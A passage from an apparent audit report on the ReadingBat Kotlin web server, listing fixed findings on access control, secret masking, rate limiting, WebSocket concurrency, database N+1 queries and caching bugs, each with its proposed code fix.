        ?.let { prefix -> Invocation(line.extractBalancedContent("$prefix(")) }
    }
```

This preserves source-line order so invocation[i] aligns with correctAnswers[i] produced by convertToScript. It keeps the existing `startsWith("$prefix(")` matcher, which correctly disambiguates `ArrayUtils.arrayPrint(` from bare `arrayPrint(` (the trimmed line for the former starts with `ArrayUtils.`, not `arrayPrint(`), so no double counting occurs. Add a regression test in TestData with a challenge interleaving System.out.println and arrayPrint to lock in the ordering.

## 14. 🟠 MEDIUM — Attacker-controlled response count causes IndexOutOfBoundsException in checkAnswers

- [x] **Addressed** — PR #109

- **Category:** correctness | **Subsystem:** posts-answers | **Verifier confidence:** high
- **Location:** `readingbat-core/src/main/kotlin/com/readingbat/posts/ChallengePost.kt:203-211`

**Problem:** checkAnswers derives the number of responses purely from the inbound request: `userResponses = params.entries().filter { it.key.startsWith(RESP) }`, then iterates `userResponses.indices.map { i -> funcInfo.checkResponse(i, userResponse) }`. checkResponse (FunctionInfo.kt:232-254) indexes `correctAnswers[index]` and `invocations[index]` directly with no bounds check. The number of `response*` form parameters is fully client-controlled, while invocations/correctAnswers have a fixed size per challenge. A client that POSTs more `response0..responseN` params than the challenge has invocations triggers a raw IndexOutOfBoundsException (unhandled -> 500). Because `RESP = "response"` and the filter is `startsWith(RESP)`, params such as `responseFoo` also inflate `userResponses.size` while `paramMap[RESP + i]` looks up numeric `responseN` keys, so a non-contiguous/oversized set additionally hits `error("Missing user response")` at line 209. This is reachable by any user (the route does not require auth — `user` is nullable) and is trivially weaponizable for resource/error-rate abuse, and corrupts the answer-checking contract.

**Fix:** Validate the request shape before iterating. In ChallengePost.checkAnswers, replace the indices-based loop with one bounded by the challenge's invocation count and looking up only numeric response keys that actually exist. For example:\n\n  val funcInfo = challenge.functionInfo()\n  val results =\n    (0 until funcInfo.invocationCount).map { i ->\n      val userResponse = paramMap[RESP + i]?.trim()\n        ?: throw InvalidRequestException(\"Missing or invalid response$i\")\n      funcInfo.checkResponse(i, userResponse)\n    }\n\nThis ignores extra/oversized or non-numeric response* params and uses InvalidRequestException (already handled distinctly by StatusPages -> invalidRequestPage) so malformed submissions yield a clean validation response instead of an IndexOutOfBoundsException-driven generic error page. Optionally also reject when the count of numeric response keys differs from funcInfo.invocationCount to surface a clear 400.

## 15. 🟠 MEDIUM — WS publish can suspend the answer-submission request handler under buffer overflow

- [x] **Addressed** — PR #112

- **Category:** concurrency | **Subsystem:** posts-answers | **Verifier confidence:** high
- **Location:** `readingbat-core/src/main/kotlin/com/readingbat/common/AnswerPublisher.kt:63`

**Problem:** publishAnswers/publishLikeDislike call `wsFlow.emit(...)` on a MutableSharedFlow created with only `extraBufferCapacity = 64` and the default `onBufferOverflow = SUSPEND` (ChallengeWs.kt:81-89, FLOW_BUFFER_CAPACITY = 64). A MutableSharedFlow with replay=0 and no active/slow collector means emit must wait for buffer space; with onBufferOverflow=SUSPEND, `emit` suspends. This emit runs inline in the checkAnswers request coroutine (saveChallengeAnswers lines 443-447, called from the /checkAnswers route). If the consuming dispatcher coroutine (ChallengeWs answerWsConnections collector, which does blocking `wsSession.outgoing.send` per connection) stalls or a teacher socket is slow, the buffer fills and student answer POSTs block/slow down. This couples teacher-dashboard delivery latency into the student submission path.

**Fix:** Decouple the dashboard publish path from the student request path so a slow/absent teacher socket can never apply backpressure to emit. Construct the answer/dashboard flows with `onBufferOverflow = BufferOverflow.DROP_OLDEST` (dashboard updates are best-effort real-time data; dropping an intermediate update is acceptable and the next update supersedes it), e.g. in ChallengeWs.kt:81-89:
`MutableSharedFlow<ChallengeAnswerData>(extraBufferCapacity = FLOW_BUFFER_CAPACITY, onBufferOverflow = BufferOverflow.DROP_OLDEST)`.
With DROP_OLDEST the buffer self-evicts, so the still-`suspend` emit in AnswerPublisher never blocks. Apply the same change to multiServerWsWriteFlow/multiServerWsReadFlow (and for consistency the analogous flows in LoggingWs.kt:78-79). Alternatively, keep the flows as-is but in AnswerPublisher.publishAnswers/publishLikeDislike replace `wsFlow.emit(data)` with `if (!wsFlow.tryEmit(data)) logger.warn { "Dropped dashboard update for $targetName (ws buffer full)" }`, which also guarantees emit is non-blocking. The DROP_OLDEST approach is cleaner since callers are already suspend; note that whichever single drain coroutine still serializes outgoing.send across connections, so a separately stalled teacher socket no longer harms other students' submission latency.

## 16. 🟠 MEDIUM — REMOVE_FROM_CLASS does not verify the target student belongs to a class the teacher owns

- [x] **Addressed** — covered by #2 (PR #101)

- **Category:** security | **Subsystem:** posts-answers | **Verifier confidence:** high
- **Location:** `readingbat-core/src/main/kotlin/com/readingbat/posts/TeacherPrefsPost.kt:95-103`

**Problem:** In teacherPrefs REMOVE_FROM_CLASS, the handler takes an arbitrary `USER_ID_PARAM`, resolves `student = studentId.toUser()`, reads `student.enrolledClassCode`, and immediately calls `student.withdrawFromClass(classCode)` — with no check that the authenticated `user` is the teacher who owns that class (compare with deleteClass/updateActiveClass which operate on the caller's own class codes). Any authenticated user who can reach the teacher-prefs POST can supply another student's id and forcibly un-enroll that student from whatever class they are in. This is a broken-access-control / IDOR issue on a state-changing action.

**Fix:** Verify ownership before withdrawing. In the REMOVE_FROM_CLASS branch, after resolving `classCode = student.enrolledClassCode`, confirm the authenticated `user` is the teacher who owns that class before calling `withdrawFromClass`. For example:

```kotlin
REMOVE_FROM_CLASS -> {
  val studentId = params[USER_ID_PARAM] ?: error("Missing: $USER_ID_PARAM")
  val student = studentId.toUser()
  val classCode = student.enrolledClassCode
  if (classCode.isNotValid() || classCode.fetchClassTeacherId() != user.userId)
    throw InvalidRequestException(
      "User id ${user.userId} does not own class ${classCode}"
    )
  student.withdrawFromClass(classCode)
  val msg = "${student.fullName} removed from class ${classCode.toDisplayString()}"
  logger.info { msg }
  classSummaryPage(content, user, classCode, msg = Message(msg))
}
```

Use the existing `ClassCode.fetchClassTeacherId()` (ClassCodeRepository.kt:140) and compare against `user.userId`, mirroring the check already present in `classSummaryPage` (ClassSummaryPage.kt:136) — but place it BEFORE the destructive `withdrawFromClass` call so the mutation is gated. (Optionally also confirm the student is actually enrolled in that class to avoid acting on DISABLED_CLASS_CODE.)

## 17. 🟠 MEDIUM — Pinger iterates Collections.synchronizedSet without holding its monitor; CME permanently kills the ping coroutine

- [x] **Addressed** — PR #111

- **Category:** concurrency | **Subsystem:** websockets | **Verifier confidence:** high
- **Location:** `readingbat-core/src/main/kotlin/com/readingbat/server/ws/ChallengeWs.kt:116-130`

**Problem:** answerWsConnections is a Collections.synchronizedSet(LinkedHashSet) (line 91). Its Javadoc requires the caller to manually synchronize on the set while iterating. The pinger does `for (sessionContext in answerWsConnections)` (line 119) with NO `synchronized(answerWsConnections){}` block. Meanwhile the endpoint handler concurrently mutates the set from other coroutines via `answerWsConnections += answerWsContext` (line 182) and `answerWsConnections -= answerWsContext` (line 210). A structural modification during iteration throws ConcurrentModificationException from the LinkedHashSet iterator's next()/hasNext(). The inner runCatching (line 121) only wraps the JSON build + send, NOT the iterator advance, so the CME propagates out of the for-loop and out of the `while (isActive)` body, terminating the single pinger coroutine for the entire process lifetime. After that, no client ever receives keep-alive pings again. The same unsynchronized-iteration hazard exists in the dispatcher at line 157 (`answerWsConnections.filter{}.forEach{}`), but there the whole block is inside runCatching (lines 152-164) so it recovers (with spurious error logs) — the pinger does not.

**Fix:** Snapshot the set under its monitor, then iterate the copy so the suspending send is never executed while holding an unsynchronized live iterator. Replace the pinger loop (lines 119-128) with:

  val snapshot = synchronized(answerWsConnections) { answerWsConnections.toList() }
  for (sessionContext in snapshot) {
    if (sessionContext.enabled) {
      runCatching {
        val json = PingMessage(sessionContext.start.elapsedNow().format()).toJson()
        sessionContext.wsSession.outgoing.send(Frame.Text(json))
      }.onFailure { e ->
        logger.error { "Exception in pinger ${e.simpleClassName} ${e.message}" }
      }
    }
  }

Using a copy (rather than holding synchronized() across the loop) avoids holding the set lock across the suspending send calls. Apply the same snapshot pattern to the dispatcher at lines 157-163 (e.g. `synchronized(answerWsConnections) { answerWsConnections.filter { it.targetName == data.target } }.forEach { ... }`) to remove the latent CME there as well, even though it currently self-heals. As defense in depth, the pinger could also be moved onto a supervised/retried structure, but the snapshot fix is sufficient.

## 18. 🟠 MEDIUM — Clock pinger has the same unsynchronized synchronizedSet iteration that can kill the coroutine

- [x] **Addressed** — PR #111

- **Category:** concurrency | **Subsystem:** websockets | **Verifier confidence:** high
- **Location:** `readingbat-core/src/main/kotlin/com/readingbat/server/ws/ClockWs.kt:73-88`

**Problem:** wsConnections is a Collections.synchronizedSet (line 60). The clock pinger does `for (sessionContext in wsConnections)` (line 77) without `synchronized(wsConnections){}`, while the endpoint adds/removes from the set (lines 98, 106) from other coroutines. A ConcurrentModificationException from the iterator is not caught (the runCatching at line 78 only wraps the send), so it propagates out of the for-loop and terminates the `while (isActive)` pinger loop. Lower severity only because clockWsEndpoint is currently commented out of the route table (WsCommon.kt line 62), so the endpoint is unreachable today, but the bug is live the moment it is re-enabled.

**Fix:** Take a snapshot under the set's intrinsic monitor and iterate the snapshot, so iteration is decoupled from concurrent mutation:

```kotlin
init {
  scope.launch(CoroutineName("clock-pinger")) {
    while (isActive) {
      delay(1.seconds)
      val snapshot = synchronized(wsConnections) { wsConnections.toList() }
      for (sessionContext in snapshot) {
        runCatching {
          val elapsed = sessionContext.start.elapsedNow().format()
          val json = PingMessage("$elapsed [${wsConnections.size}/$maxWsConnections]").toJson()
          sessionContext.wsSession.outgoing.send(Frame.Text(json))
        }.onFailure { e ->
          logger.error { "Exception in pinger: ${e.simpleClassName} ${e.message}" }
        }
      }
    }
  }
}
```

`synchronized(wsConnections) { wsConnections.toList() }` copies the set while holding the same monitor the synchronizedSet wrapper uses, eliminating the CME risk. Note: ChallengeWs.kt (line 119) has the same unsynchronized-iteration pattern and should receive the identical treatment; the finding's claim that ChallengeWs was already fixed is incorrect.

## 19. 🟠 MEDIUM — N+1 blocking JDBC transactions executed inside the WebSocket coroutine

- [x] **Addressed** — PR #111 (partial: N+1 collapsed; IO offload & batching deferred)

- **Category:** performance | **Subsystem:** websockets | **Verifier confidence:** high
- **Location:** `readingbat-core/src/main/kotlin/com/readingbat/server/ws/ChallengeGroupWs.kt:130-158`

**Problem:** Inside the ws `collect{}` block the handler loops over every challenge x every enrollee x every invocation, and for each it opens a separate blocking Exposed transaction: `enrollee.historyExists(...)` and `enrollee.answerHistory(...)` each call `readonlyTx{}` (User.kt lines 305-318), and an additional `readonlyTx{}` is opened per enrollee for likeDislike (lines 149-158). For a class of N students with C challenges and I invocations this is on the order of N*C*(2I+1) synchronous DB round-trips, all run on the WebSocket's coroutine dispatcher, blocking that thread for the entire computation. ClassSummaryWs (lines 100-163) and StudentSummaryWs (lines 96-164) have the same per-invocation `readonlyTx` N+1 pattern. This blocks a server worker thread, starves other requests/connections, and scales poorly with class size.

**Fix:** Offload the blocking DB work and batch the queries. Wrap the per-message DB computation in withContext(Dispatchers.IO) (or run it inside a CoroutineScope(SupervisorJob() + Dispatchers.IO) like ChallengeWs/ClockWs/LoggingWs already do) so the blocking JDBC calls no longer run on the WebSocket coroutine's dispatcher.

Then collapse the N+1 transactions. Per enrollee, replace the per-invocation enrollee.historyExists()/enrollee.answerHistory() calls (each its own readonlyTx) with a single call to the existing User.answerHistoryBulk(challengeMd5s) (User.kt:340), passing all invocation md5s for the challenge(s), and look results up from the returned Map<String, ChallengeHistory> (treat a missing key as 'not attempted', mirroring historyExists). Replace the per-enrollee likeDislike readonlyTx (ChallengeGroupWs.kt:149-158, and enrollee.likeDislike(challenge) in ClassSummaryWs/StudentSummaryWs) with a single batched like/dislike query over all (userRef, md5) pairs for the class — ideally one query per class rather than one per enrollee. This reduces the work from O(N*C*(2I+1)) transactions to roughly one or two queries per enrollee (or per class). Apply the same change to ClassSummaryWs.kt (resolving its existing TODO at line 145) and StudentSummaryWs.kt.

## 20. 🟠 MEDIUM — Single shared dispatcher coroutine sends to all clients sequentially; one slow client blocks answer delivery to everyone

- [x] **Addressed** — PR #111

- **Category:** design | **Subsystem:** websockets | **Verifier confidence:** high
- **Location:** `readingbat-core/src/main/kotlin/com/readingbat/server/ws/ChallengeWs.kt:150-170`

**Problem:** There is exactly one dispatcher coroutine (launched once in init at line 150) that fans out every ChallengeAnswerData to all matching teacher sessions via `it.wsSession.outgoing.send(Frame.Text(...))` inside a `forEach` inside `collect` (lines 159-163). The `send` is a suspending call against each session's outgoing channel, which has a bounded buffer. If any one teacher's client is slow/stalled and its outgoing buffer fills, `send` suspends, blocking the single dispatcher loop and thereby delaying (head-of-line blocking) answer updates to every other teacher in every other class until that one client drains or disconnects. There is no per-connection isolation and no send timeout.

**Fix:** Isolate per-recipient delivery so one slow consumer cannot stall the shared dispatcher. Within the forEach, instead of awaiting send sequentially, either (a) launch each send in a child coroutine bounded by a timeout and close stalled sessions, e.g. scope.launch { withTimeoutOrNull(5.seconds) { it.wsSession.outgoing.send(Frame.Text(data.jsonArgs)) } ?: it.wsSession.close(CloseReason(GOING_AWAY, "Slow consumer")) }; or (b) use a non-suspending it.wsSession.outgoing.trySend(...) and on failure log/drop or close that one connection. Prefer per-session child coroutines under the existing SupervisorJob scope so a failure or stall on one session is isolated from the others, and keep the per-send work in its own try/catch so an exception on one recipient no longer restarts the entire collect loop. Apply the same isolation pattern to the pinger loop (lines 119-128), which shares the sequential-send shape (its runCatching guards exceptions but not suspension/blocking).

## 21. 🟠 MEDIUM — Geo cache never short-circuits the DB: every cached lookup still issues a per-request SELECT

- [x] **Addressed** — PR #112

- **Category:** performance | **Subsystem:** db-layer | **Verifier confidence:** high
- **Location:** `readingbat-core/src/main/kotlin/com/readingbat/server/GeoInfo.kt:148-183`

**Problem:** lookupGeoInfo() is meant to be a 3-tier cache (in-memory -> Postgres -> API). But every GeoInfo placed into geoInfoMap is constructed with requireDbmsLookUp=true: the API path returns GeoInfo(true, -1, ...) (line 148) and the failure path returns GeoInfo(true, -1, ipAddress, "") (line 177). Only the Postgres path (queryGeoInfo, line 159) produces requireDbmsLookUp=false with a real dbmsId. The consuming code in Intercepts.kt:247-251 then does: `if (geoInfo.requireDbmsLookUp) queryGeoInfo(ipAddress)?.dbmsId ...`. So for any IP whose GeoInfo entered the map via the API or failure branch, EVERY subsequent request re-runs queryGeoInfo() against Postgres to recover the id, even though the entry is 'cached' in memory. The in-memory cache only saves the API call, not the DB round-trip it was designed to eliminate — a per-request N+1-style SELECT on the hot request-logging path.

**Fix:** In lookupGeoInfo, after .also { it.insert() }, replace the cached instance with one carrying the real generated id and requireDbmsLookUp=false so Intercepts.kt can read geoInfo.dbmsId directly. Simplest robust approach: have the getOrPut block, after insert(), re-query to obtain the persisted id and store that, e.g. the API/failure branches should resolve to `queryGeoInfo(ipAddress) ?: <the just-built instance>` after insert so the cached value has requireDbmsLookUp=false and a valid dbmsId. Cleaner: change insert() to return the upsert's generated id and rebuild the GeoInfo with GeoInfo(false, returnedId, remoteHost, json) before putting it in the map. Either way the goal is that no entry with requireDbmsLookUp=true ever remains cached after insert, eliminating the per-request queryGeoInfo SELECT in Intercepts.kt:248-249 (which could then read geoInfo.dbmsId unconditionally). Note: the failure branch stores json="" so summary/fields are blank, but the dbmsId is still valid post-insert, so caching requireDbmsLookUp=false there is correct.

## 22. 🟠 MEDIUM — Single global Mutex serializes all geo lookups across the blocking external API call

- [x] **Addressed** — PR #112

- **Category:** concurrency | **Subsystem:** db-layer | **Verifier confidence:** high
- **Location:** `readingbat-core/src/main/kotlin/com/readingbat/server/GeoInfo.kt:140-183`

**Problem:** lookupGeoInfo() guards the whole cache-miss path with one process-wide Mutex (line 140, used at 169). Inside withLock it runs queryGeoInfo() (a blocking JDBC transaction), and on a DB miss the blocking ipgeolocation.io HTTP call callGeoInfoApi() plus insert() (another blocking transaction). Because the mutex is a single shared lock keyed on nothing, a slow or hanging external API call for one IP blocks geo resolution for EVERY other IP and every other request that reaches a cache miss — head-of-line blocking on the per-request logging path. Holding a coroutine Mutex across blocking JDBC/HTTP also pins the lock for the full network latency.

**Fix:** Replace the global Mutex with per-IP request coalescing so concurrent lookups for the same IP share one in-flight request while different IPs proceed in parallel, and move the blocking JDBC/HTTP work off any shared critical section. For example use a `ConcurrentHashMap<String, Deferred<GeoInfo>>` keyed on ipAddress: on a cache miss, `computeIfAbsent(ip) { scope.async(Dispatchers.IO) { queryGeoInfo(ip) ?: callGeoInfoApi(ip) ... .also { it.insert() } } }`, await the Deferred, store the resolved GeoInfo into geoInfoMap, and remove the inflight entry in a finally. Additionally, configure the HttpClient with the HttpTimeout plugin (request/connect/socket timeouts) so a hung ipgeolocation.io endpoint cannot stall the logging path indefinitely. Wrapping the JDBC calls in withContext(Dispatchers.IO) is also advisable since they are blocking.

## 23. 🟠 MEDIUM — obfuscate(4) leaks 75% of every secret in logs and the admin config page

- [x] **Addressed** — PR #106

- **Category:** security | **Subsystem:** config-server | **Verifier confidence:** high
- **Location:** `readingbat-core/src/main/kotlin/com/readingbat/common/EnvVar.kt:38-52`

**Problem:** The mask functions for secrets use `obfuscate(4)`: GITHUB_OAUTH_CLIENT_SECRET (line 38), GOOGLE_OAUTH_CLIENT_SECRET (line 40), IPGEOLOCATION_KEY (line 42), RESEND_API_KEY (line 45), DBMS_URL (line 50). The library implementation is `fun String.obfuscate(freq: Int = 2) = mapIndexed { i, v -> if (i % freq == 0) '*' else v }` (common-utils StringExtensions.kt:461), so `obfuscate(4)` only masks indices 0,4,8,... — it leaves 75% of the characters in cleartext. Verified: obfuscate(4) of 'ghp_AbCdEfGhIjKlMnOpQrStUvWxYz...' yields '*hp_*bCd*fGh*jKl...'. The same `obfuscate(4)` maskFunc is used in Property.kt (RESEND_API_KEY line 224, GITHUB_OAUTH_CLIENT_SECRET line 417, GOOGLE_OAUTH_CLIENT_SECRET line 430), and Property.setProperty() logs the value through this maskFunc (Property.kt:110 `logger.info { "$this" }`), and SystemConfigurationPage.kt renders `it.maskFunc(it)` for every property/env var. So 75% of OAuth client secrets, the Resend API key, the geolocation key, and the JDBC URL (which may contain credentials) are exposed in startup logs and the admin page. For short secrets this is effectively a full disclosure.

**Fix:** Stop partially revealing secrets. The codebase already has the correct idiom: `obfuscate(1)` masks every character (used for DBMS_PASSWORD at EnvVar.kt:52 and Property.kt:392). Apply a full-mask or fixed-redaction approach to all secret maskFuncs.

In EnvVar.kt, change lines 38, 40, 42, 45, 50 from `?.obfuscate(4)` to a redaction that does not leak content, e.g.:
- Full mask: `{ getEnvOrNull()?.obfuscate(1) ?: UNASSIGNED }`
- Or last-4 reveal: `{ getEnvOrNull()?.let { "****" + it.takeLast(4) } ?: UNASSIGNED }`

In Property.kt, apply the same change to lines 224, 417, and 430 (currently `?.obfuscate(4)`).

If a last-4 helper is preferred for usability, add a single shared extension (e.g. `fun String.redact() = "****" + takeLast(4)`) and use it consistently, so both EnvVar.kt and Property.kt go through one masking function. Be aware that DBMS_URL may embed `user:password@host`; even last-4 of a full JDBC URL is safe, but full masking is the most conservative choice for the URL. Keep DBMS_PASSWORD's existing `obfuscate(1)`.

## 24. 🟠 MEDIUM — Rate limiter uses a single global bucket (no per-client key)

- [x] **Addressed** — covered by #6 (PR #99)

- **Category:** correctness | **Subsystem:** config-server | **Verifier confidence:** high
- **Location:** `readingbat-core/src/main/kotlin/com/readingbat/server/Installs.kt:152-158`

**Problem:** Even after the limiter is made active (see the register-vs-global finding), there is no `requestKey { }` configured. Ktor's default request key is `Unit`: RateLimitConfig.kt:122 documents 'By default, the key is a Unit, so all requests share the same Rate-Limit.' With limit=10 and refillPeriod=1s that means a global cap of ~10 requests/second shared across ALL clients. A single client (or normal aggregate traffic) trivially exhausts the bucket and rate-limits every other user — both an availability problem and an ineffective abuse control (one abusive client is indistinguishable from everyone else).

**Fix:** When the limiter is properly activated (i.e., switch `register { }` to `global { }`, OR keep `register` and wrap routes in `rateLimit { }`), add a per-client key so each client gets its own bucket. e.g.:\n\ninstall(RateLimit) {\n  global {\n    rateLimiter(\n      limit = EnvVar.RATE_LIMIT_COUNT.getEnv(10),\n      refillPeriod = EnvVar.RATE_LIMIT_SECS.getEnv(1).seconds,\n    )\n    requestKey { call -> call.request.origin.remoteHost }\n  }\n}\n\nNote: XForwardedHeaders is already conditionally installed in this same file (Installs.kt:120-126), so when XFORWARDED_ENABLED is true, `call.request.origin.remoteHost` will resolve to the real client IP behind the proxy rather than the proxy's address. Without ForwardedHeaderSupport active, all proxied requests would share the proxy IP's bucket, so the per-client key should be paired with the forwarded-header handling. This change should be coordinated with fixing the register-vs-global activation issue, since without that the key is moot.

## 25. 🟠 MEDIUM — getEnv(Int) calls toInt() and crashes startup on a non-numeric env var

- [x] **Addressed** — PR #108

- **Category:** error-handling | **Subsystem:** config-server | **Verifier confidence:** high
- **Location:** `readingbat-core/src/main/kotlin/com/readingbat/common/EnvVar.kt:73`

**Problem:** `fun getEnv(default: Int) = System.getenv(name)?.toInt() ?: default` uses `toInt()`, which throws NumberFormatException on any non-numeric value rather than falling back to the default. This is used at server boot for RATE_LIMIT_COUNT and RATE_LIMIT_SECS (Installs.kt:155-156 `EnvVar.RATE_LIMIT_COUNT.getEnv(10)` / `RATE_LIMIT_SECS.getEnv(1)`). A typo like `RATE_LIMIT_COUNT=10x` (or an accidental trailing space/newline) crashes the entire application during plugin install instead of degrading to the default. Note the String/Boolean overloads on lines 66/69 are tolerant (Boolean uses toBoolean which never throws), so this Int overload is inconsistent with the others.

**Fix:** Make the Int overload tolerant to match the String/Boolean overloads:

```kotlin
/** Returns the environment variable value as an Int, or [default] if not set or unparseable. */
fun getEnv(default: Int) = System.getenv(name)?.toIntOrNull() ?: default
```

Optionally log a warning when a set-but-unparseable value is encountered so silent fallback is observable, e.g.:

```kotlin
fun getEnv(default: Int): Int {
  val raw = System.getenv(name) ?: return default
  return raw.toIntOrNull() ?: default.also {
    logger.warn { "Ignoring non-numeric value for env var $name; using default $default" }
  }
}
```

The `@Suppress("unused")` on line 72 can also be removed since the overload is used at Installs.kt:155-156.

## 26. 🟠 MEDIUM — Dir-contents cache write/read key mismatch makes the cache a permanent miss and leaks memory

- [x] **Addressed** — PR #112

- **Category:** bug | **Subsystem:** utils-misc | **Verifier confidence:** high
- **Location:** `readingbat-core/src/main/kotlin/com/readingbat/dsl/ChallengeGroup.kt:87-111`

**Problem:** fetchRemoteFiles writes into dirCache under the composite key dirContentsKey(path) = keyOf(DIR_CONTENTS_KEY, md5Of(path)) (i.e. "dir-contents|<md5>", lines 105-107), but fetchDirContentsFromDirCache reads with the raw path as the key: dirCache[path] (line 91). Those two keys can never be equal (keyOf prefixes "dir-contents" and md5-hashes the path), so the read at line 91 is always null. Consequently fileList (line 120) always falls through to fetchRemoteFiles and re-hits GitHub on every group load, defeating the cache entirely. Worse, because the write key dirContentsKey(path) IS stable, every repeated load of the same path runs computeIfAbsent(key){mutableListOf()} then addAll(it) on the SAME list (lines 106-107), so the cached list grows without bound across content reloads, accumulating duplicate file names — an unbounded memory leak in the shared ContentCaches.dirCache.

**Fix:** Use one consistent composite key on both the read and write sides, and overwrite instead of appending (mirroring sourceCache/contentDslCache). Change line 91 to read with the composite key: `dirCache[dirContentsKey(path)]?.toList()`. In fetchRemoteFiles (lines 104-108), replace the computeIfAbsent+addAll with a plain overwrite so reloads do not accumulate duplicates: `synchronized(dirCache) { dirCache[dirContentsKey(path)] = it.toMutableList(); logger.info { "Saved to dir cache: ${path.toDoubleQuoted()}" } }`. (With overwrite-on-write, the explicit synchronized block is no longer strictly necessary on a ConcurrentHashMap, but keeping it is harmless.) After this change, fetchDirContentsFromDirCache returns the cached listing on subsequent loads and the cached list no longer grows unbounded across reloads.

## 27. 🟡 LOW — In-memory enrolledClassCode mutated inside DB update builder, desyncs on rollback

- [x] **Addressed** — PR #113

- **Category:** correctness | **Subsystem:** auth-users | **Verifier confidence:** medium
- **Location:** `readingbat-core/src/main/kotlin/com/readingbat/common/User.kt:278-285`

**Problem:** `assignEnrolledClassCode` mutates the in-memory field `this@User.enrolledClassCode = classCode` inside the `update({...}) { row -> ... }` builder lambda (line 283). The assignment is a side effect executed while constructing the UPDATE statement, before the surrounding `transaction` commits. In `enrollInClass` (User.kt:406-430) and `withdrawFromClass` (User.kt:432-444) this update is followed by `addEnrollee`/`removeEnrollee` within the same transaction; if a later statement throws and the transaction rolls back, the database `enrolled_class_code` is unchanged but the in-memory `User.enrolledClassCode` has already been overwritten, leaving the object inconsistent with persisted state for the remainder of the request (and any subsequent `enrollInClass` rollback logic reads the wrong `previousClassCode`).

**Fix:** Move the in-memory field assignment out of the SQL-builder lambda so it only happens after the enclosing transaction commits successfully. Change assignEnrolledClassCode to only issue the UPDATE (drop line 283), and set this.enrolledClassCode at the end of enrollInClass/withdrawFromClass after the `transaction { ... }` block returns:

  private fun assignEnrolledClassCode(classCode: ClassCode) =
    with(UsersTable) {
      update({ id eq userDbmsId }) { row ->
        row[updated] = nowInstant()
        row[enrolledClassCode] = classCode.classCode
      }
    }

Then in enrollInClass, after the transaction block:
        transaction {
          val previousClassCode = enrolledClassCode
          if (previousClassCode.isEnabled) previousClassCode.removeEnrollee(this@User)
          assignEnrolledClassCode(classCode)
          classCode.addEnrollee(this@User)
        }
        enrolledClassCode = classCode   // only after commit

and in withdrawFromClass, after its transaction block:
        enrolledClassCode = DISABLED_CLASS_CODE

This keeps the in-memory value consistent with persisted state on rollback. Optionally `transaction {}` returns its lambda's value, so the assignment can be placed on the line following the block. Low priority given the limited trigger path and request-scoped lifetime of User.

## 28. 🟡 LOW — findOrCreateOAuthUser performs non-atomic read-then-write across separate transactions (TOCTOU)

- [x] **Addressed** — PR #113 (partial: existing-user auto-link upserted; new-user race deferred)

- **Category:** concurrency | **Subsystem:** oauth-routes | **Verifier confidence:** high
- **Location:** `readingbat-core/src/main/kotlin/com/readingbat/server/routes/OAuthRoutes.kt:202-292`

**Problem:** The function issues each query/mutation in its own `readonlyTx { }` / `transaction { }` (lines 211, 223, 234, 255, 267), so the 'does a link exist?' check, the 'does the email match a user?' check, and the subsequent insert into OAuthLinksTable / createOAuthUser are not in a single transaction. Two concurrent OAuth callbacks for the same provider+providerId (e.g., a user double-clicking, or provider retries) can both observe 'no existing link' and both fall through to insert. Depending on OAuthLinksTable constraints this either throws a duplicate-key exception surfaced to the user or creates a duplicate user/link. The createOAuthUser path (User.kt:660) similarly checks-then-inserts without locking on email.

**Fix:** Make the find-or-create flow idempotent and atomic by relying on the existing unique constraints rather than separate check-then-insert transactions:

1. Wrap the whole find-or-create in a single transaction { } so the link lookup, email lookup, and insert observe a consistent view.
2. For the new-user / auto-link inserts into OAuthLinksTable, use an upsert / insertIgnore against the oauth_links_provider_unique (provider, provider_id) constraint, then re-select the row. This turns a concurrent duplicate callback into a no-op-then-read instead of a duplicate-key exception.
3. Catch the (now much narrower) ExposedSQLException for the email/provider unique violations and convert it into a re-read of the existing link/user so the second racing request returns the same User rather than surfacing a 500 via the StatusPages handler.

This is a low-priority hardening change: the unique constraints already prevent data corruption today; the only observable symptom is a rare transient error page when the same provider account triggers two near-simultaneous callbacks.

## 29. 🟡 LOW — Blocking remote fetch and runBlocking script eval performed inside ConcurrentHashMap.computeIfAbsent

- [x] **Addressed** — PR #113

- **Category:** concurrency | **Subsystem:** dsl-script-eval | **Verifier confidence:** medium
- **Location:** `readingbat-core/src/main/kotlin/com/readingbat/dsl/challenge/Challenge.kt:154-187`

**Problem:** functionInfo() calls content.functionInfoMap.computeIfAbsent(challengeId) { ... } where functionInfoMap is a ConcurrentHashMap<Int, FunctionInfo> (ReadingBatContent.kt:85). The mapping lambda performs a synchronous network fetch `URL(path).readText()` (line 162) and then measureParsing -> runBlocking { computeFunctionInfo(code) } (line 140), which suspends on the script pool's Channel.receive() and evals a script. ConcurrentHashMap.computeIfAbsent holds the bin lock for the entire duration of the mapping function; the JavaDoc explicitly warns the computation should be short and must not update other mappings. Holding the lock across multi-second network I/O plus runBlocking serializes any other thread whose challengeId hashes to the same bin and can stall under concurrent first-time loads, defeating the pool's concurrency. The same pattern exists at line 184 for the local-file branch.

**Fix:** Move the expensive fetch+eval outside the locked region of computeIfAbsent. Simplest: use a double-checked get/putIfAbsent — `content.functionInfoMap[challengeId] ?: run { val fi = <fetch + measureParsing> ; content.functionInfoMap.putIfAbsent(challengeId, fi) ?: fi }` (accepts a small chance of redundant computation on a true race, which is harmless here). If single-computation must be guaranteed, store a memoized holder (e.g., a Lazy<FunctionInfo> or CompletableFuture/Deferred) as the map value so computeIfAbsent only creates a cheap placeholder while the actual blocking fetch+eval runs outside the map's bin lock. Either way, eliminate runBlocking { computeFunctionInfo(code) } from inside computeIfAbsent. Apply the same change to the local-file branch at line 184.

## 30. 🟡 LOW — NullPointerException masks the intended error when a Java challenge script returns null

- [x] **Addressed** — fixed on master

- **Category:** error-handling | **Subsystem:** dsl-script-eval | **Verifier confidence:** medium
- **Location:** `readingbat-core/src/main/kotlin/com/readingbat/dsl/challenge/Challenge.kt:265-269`

**Problem:** JavaScript.evalScript returns Any? (it can return null; see common-utils JavaScript.kt:118-135). Challenge.kt assigns `val correctAnswers = timedValue.value` then checks `if (correctAnswers !is List<*>) error("Invalid type returned for $challengeName [${correctAnswers::class.java.simpleName}]")`. When the script evaluates to null, the `!is List<*>` branch is taken and `correctAnswers::class` dereferences null, throwing a NullPointerException instead of producing the intended descriptive IllegalStateException. The diagnostic for a malformed challenge is lost.

**Fix:** Short-circuit the null case before the `::class` dereference. Since the static type is non-null `Any`, compare against null explicitly:

```kotlin
val correctAnswers = timedValue.value
logger.debug { "$challengeName computed answers in ${timedValue.duration}" }

@Suppress("SENSELESS_COMPARISON")
if (correctAnswers == null)
  error("Null returned for $challengeName")

if (correctAnswers !is List<*>)
